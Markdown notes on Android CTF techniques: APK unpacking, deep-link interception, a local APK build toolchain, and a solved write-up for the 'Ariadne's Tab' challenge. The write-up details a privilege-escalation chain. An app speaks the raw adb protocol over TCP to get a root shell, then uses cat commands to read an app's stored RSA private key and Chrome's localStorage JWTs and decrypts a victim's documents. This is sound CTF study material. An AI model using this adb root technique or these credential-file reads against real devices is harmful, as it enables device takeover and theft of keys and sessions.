# Android techniques

## Common styles
- Given an APK; exploit exported components/deep links; the flag is delivered via an intent to the app.

## Key techniques
1. Unpack: `unzip`, `apktool d`, `jadx` (decompile to Java).
2. AndroidManifest.xml: exported components, intent filters, deep link schemes (shipme://...), permissions.
3. Deep link interception: declare the same scheme in your own APK (submitted to the platform) to receive the flag intent; exported activity with `android:exported="true"`.
4. Static: find flag handling, broadcast receivers, services.
5. Dynamic: Frida (if root/emulator), logcat, `adb shell`, `am start` with extras.
6. The challenge 'Ship Me': the platform installs your APK with `adb install -g` and fires `am start -n me.ship/.MainActivity --eu package 'shipme://cargo/?name=FLAG...'`; your APK must expose a component that catches the intent data and returns/ships it.

## SEARCH
- "<challenge> android writeup", "deep link hijack writeup", "jadx exported component writeup"

## References
- https://book.hacktricks.wiki/en/mobile-pentesting/android-app-pentesting/


## Local APK build toolchain (this host)
- javac: `javac` (OpenJDK 17). aapt2: `aapt2`. dex: `java -cp /opt/r8.jar com.android.tools.r8.D8` (D8 9.5.10). sign: `apksigner`. align: `zipalign`.
- android.jar: `/usr/lib/android-sdk/platforms/android-23/android.jar` (API 23; compile `-source 8 -target 8 -bootclasspath android.jar`).
- Build flow: javac -> d8 -> classes.dex; aapt2 link resources -> base.apk; zip classes.dex in; zipalign; apksigner sign (debug keystore: `keytool -genkeypair`).


## Ariadne's Tab (TFC CTF 2026) — adb-over-TCP root on emulator (SOLVED)
- Challenge: web app (Rails+Auth0 encrypted docs) + Android app (Custom Tabs postMessage key provider). Flag is an encrypted doc in the bot's account; bot's Chrome holds JWT + RSA private key in localStorage. Solve APK must Log.i("TFCCTF", flag).
- Key route: the bot phone is an API 37 Google APIs emulator, `ro.build.type=userdebug`, `ro.adb.secure=0`. The emulator's adbd gateway is reachable FROM INSIDE THE GUEST at `10.0.2.2:5555` (host loopback) AND `127.0.0.1:5555`. A normal third-party APK can speak the raw adb transport protocol over a plain TCP socket and get a ROOT shell (uid=0, SELinux context `su`).
- adb transport (client -> adbd, no adb server): send `CNXN` (0x4e584e43) header {version=0x01000000, maxdata=0x100000, payload="host::"}, then `OPEN` (0x4e45504f) with payload "shell:<cmd>". Read `WRTE` (0x45545257) payloads until `CLSE` (0x45534c43). Header is 24 bytes: {cmd,arg0,arg1,len,crc32(payload),cmd^0xffffffff} all little-endian u32. With a bare "host::" banner (no shell_v2 feature) the `shell:` output is RAW (no shell-protocol framing).
- Then: `cat /data/data/com.tfcctf.ariadnetab/shared_prefs/device.xml` -> rsa_private_pkcs8 (PKCS8 b64); Chrome localStorage JWT via `cat '/data/data/com.android.chrome/app_chrome/Default/Local Storage/leveldb/'* | tr -d '\000' | ...` (tr strips UTF-16LE NULs; the WAL `*.log` is uncompressed so the JWT is contiguous). Regex `eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+` for JWTs, test each against POST /api/documents/list (Bearer). Then per doc: /api/documents/open -> cap+wrapped_key; /api/render -> ciphertext+iv; RSA/ECB/OAEPwithSHA-256andMGF1Padding unwrap -> AES/GCM/NoPadding (128-bit tag) decrypt.
- Pitfall: `for d in $(find ...)` breaks on the space in "Local Storage". Use `-exec sh -c 'cat "$1"/*' _ {} \;` or the direct quoted path.
- `su` binary on userdebug denies non-shell uids ("Permission denied"), which misled prior attempts; adb-over-TCP is the way.
- Rate limit on android.koth.pro /provision is ~15 min/team; batch your tests, collect logs via WS /ws/<session_id>.
